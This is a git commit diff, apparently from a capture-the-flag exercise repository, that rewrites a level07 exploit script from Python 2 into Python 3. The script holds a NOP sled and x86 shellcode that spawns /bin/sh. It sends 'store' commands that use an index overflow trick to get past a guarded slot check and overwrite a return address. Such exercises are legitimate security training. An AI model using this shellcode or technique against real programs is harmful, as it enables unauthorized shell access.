06cbdde690d237cc02b18bb455a767655f3014ee
solvictor <victor.egret.pro@gmail.com>
2024-10-14 19:45:19 +0200

    A bit better

--- level07/Ressources/script.py
+++ level07/Ressources/script.py
@@ -1,23 +1,15 @@
 shellcode = [0x90909090] * 69
 
 shellcode += [
-    0x6850c031,
-    0x68732f2f,
-    0x69622f68,
-    0xb0e3896e,
-    0x31c9310b,
-    0x0080cdd2,
+    0x6850C031,
+    0x68732F2F,
+    0x69622F68,
+    0xB0E3896E,
+    0x31C9310B,
+    0x0080CDD2,
 ]
 
 for i, j in enumerate(shellcode):
-	print 'store'
-	print j
-	if i % 3:
-		print i
-	else :
-		print 1073741824 + i
+    print("store", j, i if i % 3 else i + 1073741824, sep="\n")
 
-print 'store'
-print 0xffffdc24 + 200
-print 1073741824 + 114
-print "quit"
+print("store", 0xFFFFDC24 + 200, 1073741824 + 114, "quit", sep="\n")
